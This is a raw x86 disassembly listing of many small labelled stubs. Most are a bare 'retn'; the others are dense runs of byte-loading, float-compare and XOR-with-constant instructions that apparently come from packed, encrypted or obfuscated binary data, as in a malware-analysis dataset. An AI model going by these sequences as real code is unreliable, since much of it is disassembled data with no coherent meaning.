sub_48107d
retn
sub_48107e
retn
sub_48107f
retn
sub_481080
retn
sub_481081
mov edx 0xacac891e
retn
sub_481087
retn
sub_481088
retn
sub_481089
retn
sub_48108a
retn
sub_48108b
retn
sub_48108d
ficom [ esi ]
cmpsd [ esi ] [ edi ]
add edi [ edx - 0x53531798 ]
retn
sub_481097
retn
sub_481098
retn
sub_481099
retn
sub_48109a
retn
sub_48109b
retn
sub_48109c
retn
sub_48109d
retn
sub_48109e
retn
sub_48109f
retn
sub_4810a0
retn
sub_4810a1
retn
sub_4810a2
retn
sub_4810a3
retn
sub_4810a4
retn
sub_4810a5
retn
sub_4810a6
retn
sub_4810a7
retn
sub_4810a8
retn
sub_4810a9
xor eax 0x98506da
cmp [ ebx + 0x35 ] esi
fiadd [ esi ]
mov edi [ edx - 0x535311b0 ]
retn
sub_4810ba
retn
sub_4810bb
retn
sub_4810bc
retn
sub_4810bd
retn
sub_4810be
retn
sub_4810bf
retn
sub_4810c0
retn
sub_4810c1
retn
sub_4810c2
retn
sub_4810c3
retn
sub_4810c4
cmp edi [ ecx + 0xe9b9d2 ]
mov edx 0xacac95ef
retn
sub_4810dc
xor eax 0x8ab0eda
xor eax 0x39a90eda
xor al bl
mov [ edx - 0x535307ae ] edi
retn
sub_4810ef
retn
sub_4810f0
retn
sub_4810f1
retn
sub_4810f2
retn
sub_4810f3
retn
sub_4810f4
xor eax 0x35f30eda
fiadd [ esi ]
idiv [ edx - 0x53536b30 ]
retn
sub_48111d
call [ ebx + 0x53 ]
push ebx
or al 0x90
retn
sub_481124
retn
sub_481125
retn
sub_481126
retn
sub_481127
retn
sub_481128
retn
sub_481129
retn
sub_48112a
retn
sub_48112b
add al 0xba
push es
sub [ esp + ebp * 4 - 0x65ec6ca0 ] 0x90
retn
sub_481137
retn
sub_481138
fcomp [ ebx + 0x50 ]
push ds
pop ebx
fcom [ ebx ]
stosd [ edi ]
mov edx 0xacac8e48
retn
sub_481146
retn
sub_481147
retn
sub_481148
retn
sub_481149
retn
sub_48114a
retn
sub_48114b
retn
sub_48114c
retn
sub_48114d
retn
sub_48114e
retn
sub_48114f
retn
sub_481150
push eax
push ds
lahf
add ebx edx
fninit
push ebx
push ebx
push ebx
mov edx 0xacacb154
retn
sub_481160
retn
sub_481161
retn
sub_481162
retn
sub_481163
retn
sub_481164
retn
sub_481165
retn
sub_481166
retn
sub_481167
retn
sub_481168
retn
sub_481169
retn
sub_48116a
retn
sub_48116b
retn
sub_48116c
mov ebx 0xacacb890
ficom [ esi ]
lahf
mov edx 0xacacb2da
retn
sub_4811cf
retn
sub_4811d0
retn
sub_4811d1
add eax 0xaf16da04
ficom [ esi ]
cmpsd [ esi ] [ edi ]
ficom [ esi ]
stosd [ edi ]
jmp r-xdata
retn
sub_48120c
retn
sub_48120d
retn
sub_48120e
retn
sub_48120f
retn
sub_481210
mov ebx 0xacaceeb2
add edi [ edx - 0x5353775f ]
lodsb [ esi ]
scasd [ edi ]
add ebp [ esi - 0x436744a1 ]
lodsb [ esi ]
lodsb [ esi ]
rcl [ edi - 0x1d7545a1 ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_481230
retn
sub_481232
retn
sub_481233
retn
sub_481234
retn
sub_481235
fimul [ esi ]
scasd [ edi ]
mov edx 0xacaca74e
retn
sub_48123e
retn
sub_48123f
retn
sub_481240
retn
sub_481241
retn
sub_481242
retn
sub_481243
retn
sub_481244
retn
sub_481245
retn
sub_481246
retn
sub_481247
retn
sub_481248
retn
sub_481249
retn
sub_48124a
retn
sub_48124b
retn
sub_48124c
retn
sub_48124d
retn
sub_48124e
retn
sub_48124f
retn
sub_481250
retn
sub_481251
retn
sub_481252
retn
sub_481253
retn
sub_481254
retn
sub_481255
retn
sub_481256
retn
sub_481257
retn
sub_481258
retn
sub_481259
retn
sub_48125a
retn
sub_48125b
retn
sub_48125c
retn
sub_48125d
retn
sub_48125e
retn
sub_48125f
retn
sub_481260
retn
sub_481261
retn
sub_481262
retn
sub_481263
retn
sub_481264
lodsb [ esi ]
pop edi
mov edx 0xacac8ca5
retn
sub_48126d
retn
sub_48128b
rcl [ ebx + 0x53 ] cl
push ebx
fsubr [ ebx + 0x33baacd6 ]
mov bh 0xac
lodsb [ esi ]
retn
sub_481299
retn
sub_48129a
retn
sub_48129b
retn
sub_48129c
add eax 0xaceba6bb
lodsb [ esi ]
mov edx 0xacacff4b
retn
sub_4812a8
retn
sub_4812a9
retn
sub_4812aa
retn
sub_4812ab
retn
sub_4812ac
retn
sub_4812ad
retn
sub_4812ae
retn
sub_4812af
retn
sub_4812b0
retn
sub_4812b1
retn
sub_4812b2
retn
sub_4812b3
retn
sub_4812b4
xchg esp eax
push ss
mov [ 0x53395339 ] al
xchg esp eax
push ss
cmpsb [ esi ] [ edi ]
cmp [ ebx + 0x39 ] edx
push ebx
xor eax 0xacaa1694
cmp [ edx - 0x535353c5 ] 0xffffffc3
retn
sub_4812cf
retn
sub_4812d0
retn
sub_4812d1
retn
sub_4812d2
retn
sub_4812d3
retn
sub_4812d4
retn
sub_4812d5
retn
sub_4812d6
retn
sub_4812d7
retn
sub_4812d8
retn
sub_4812d9
retn
sub_4812da
ficom [ esi ]
mov bl 0x3
fcomp st6
daa
test al 0xac
lodsb [ esi ]
add edi [ edx - 0x535375d1 ]
retn
sub_4812eb
lodsb [ esi ]
cmpsd [ es : esi ] [ edi ]
mov edx 0xacacb54c
retn
sub_4812f4
retn
sub_4812f5
retn
sub_4812f6
retn
sub_4812f7
retn
sub_4812f8
retn
sub_4812f9
retn
sub_4812fa
retn
sub_4812fb
retn
sub_4812fc
retn
sub_4812fd
retn
sub_4812fe
xlat
0xac86faba 0xc3ac
retn
sub_481307
retn
sub_481308
retn
sub_481309
retn
sub_48130a
retn
sub_48130b
retn
sub_48130c
retn
sub_48130d
retn
sub_48130e
retn
sub_48130f
retn
sub_481310
retn
sub_481311
retn
sub_481312
retn
sub_481313
retn
sub_481314
retn
sub_481315
retn
sub_481316
retn
sub_481317
retn
sub_481318
retn
sub_481319
retn
sub_48131a
retn
sub_481355
push ss
sti
mov edx 0xacacb39e
retn
sub_48135d
retn
sub_48135e
cmp [ edx + 0x46ace956 ] bl
push ebx
push ebx
xor eax 0xda6247da
daa
arpl [ edi - 0x6b ] bx
pop ss
arpl [ ebx - 0x70 ] ax
pushad
xchg ebx eax
mov edx 0xacac9d94
retn
sub_48137b
retn
sub_48137c
retn
sub_48137d
retn
sub_48137e
fimul [ esi ]
mov bl 0xda
push cs
cmpsd [ esi ] [ edi ]
xor eax 0x5c551568
shr [ esi ] 0x1
in al 0xac
lodsb [ esi ]
fcom [ esi ]
cmp [ edx - 0x5353151e ] 0x5
mov edx 0xacace2b0
retn
sub_48139d
xor eax 0x8bd0eda
xor eax 0x39a30eda
or [ es : 0x39a10eda ] dh
cmp cl [ eax ]
mov edx 0xacacbb66
retn
sub_4813b6
retn
sub_4813b7
retn
sub_4813b8
retn
sub_4813b9
salc
movsd [ edi ] [ esi ]
mov edx 0xacac9c23
retn
sub_4813c1
retn
sub_4813c2
retn
sub_4813c3
retn
sub_4813c4
retn
sub_4813c5
retn
sub_4813c6
retn
sub_4813c7
retn
sub_4813c8
retn
sub_4813c9
or bh [ edx - 0x53530270 ]
retn
sub_4813d0
retn
sub_4813d1
retn
sub_4813d2
retn
sub_4813d3
retn
sub_4813d4
retn
sub_4813d5
retn
sub_4813d6
retn
sub_4813d7
or al 0x9a
nop
retn
sub_4813db
retn
sub_4813dc
retn
sub_4813dd
retn
sub_4813de
retn
sub_4813df
retn
sub_4813e0
retn
sub_4813e1
rcl [ ecx - 0x6529caaf ] 0x1
pop esp
salc
stc
mov ebp 0x900dacac
retn
sub_4813f0
retn
sub_4813f1
retn
sub_4813f2
retn
sub_4813f3
retn
sub_4813f4
retn
sub_4813f5
retn
sub_4813f6
retn
sub_4813f7
add [ esi - 0x83b5349 ] ch
push ebx
push ebx
push ebx
mov edx 0xacac9a01
retn
sub_481407
retn
sub_481408
retn
sub_481409
retn
sub_48140a
retn
sub_48140b
retn
sub_48140c
retn
sub_48140d
retn
sub_48140e
retn
sub_48140f
retn
sub_481410
fdivr [ edi - 0x53492446 ]
lodsb [ esi ]
retn
sub_481418
retn
sub_481419
retn
sub_48141a
retn
sub_48141b
retn
sub_48141c
retn
sub_48141d
retn
sub_48141e
retn
sub_48141f
retn
sub_481420
retn
sub_481421
retn
sub_481422
retn
sub_481423
retn
sub_481424
add eax [ eax ]
mov edx 0xacac9944
retn
sub_48142c
retn
sub_481437
fsubrp st3
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
mov edx 0xacacece4
retn
sub_481442
retn
sub_481443
retn
sub_481444
retn
sub_481445
retn
sub_481446
retn
sub_481447
retn
sub_481448
retn
sub_481449
retn
sub_48144a
retn
sub_48144b
retn
sub_48144c
retn
sub_48144d
retn
sub_48144e
retn
sub_48144f
retn
sub_481450
retn
sub_481451
retn
sub_481452
retn
sub_481453
retn
sub_481454
retn
sub_481455
retn
sub_481456
retn
sub_481457
retn
sub_481458
retn
sub_481459
retn
sub_48145a
retn
sub_48145b
retn
sub_48145c
retn
sub_48145d
retn
sub_48145e
retn
sub_48145f
retn
sub_481460
retn
sub_481461
retn
sub_481462
retn
sub_481463
retn
sub_481464
retn
sub_481465
retn
sub_481466
retn
sub_481467
fcomp [ esi ]
pop ebx
mov edx 0xacacee5f
retn
sub_481470
retn
sub_481471
retn
sub_481472
retn
sub_481473
retn
sub_481474
retn
sub_481475
retn
sub_481476
retn
sub_481477
retn
sub_481478
mov edx 0xacacfb9f
retn
sub_48147e
retn
sub_48147f
retn
sub_481480
retn
sub_481481
retn
sub_481482
retn
sub_481483
retn
sub_481484
retn
sub_481485
retn
sub_481486
retn
sub_481493
mov edx 0x53535356
retn
sub_481499
retn
sub_48149a
retn
sub_48149b
retn
sub_48149c
retn
sub_48149d
push 0x89ba6715
movsb [ edi ] [ esi ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_4814a6
retn
sub_4814a7
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_481595
jmp sub_403ae4
sub_48159c
pop ebp
retn
sub_48172d
jmp sub_403ae4
sub_481734
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_481787
jmp sub_403ae4
sub_48178e
pop ebp
retn
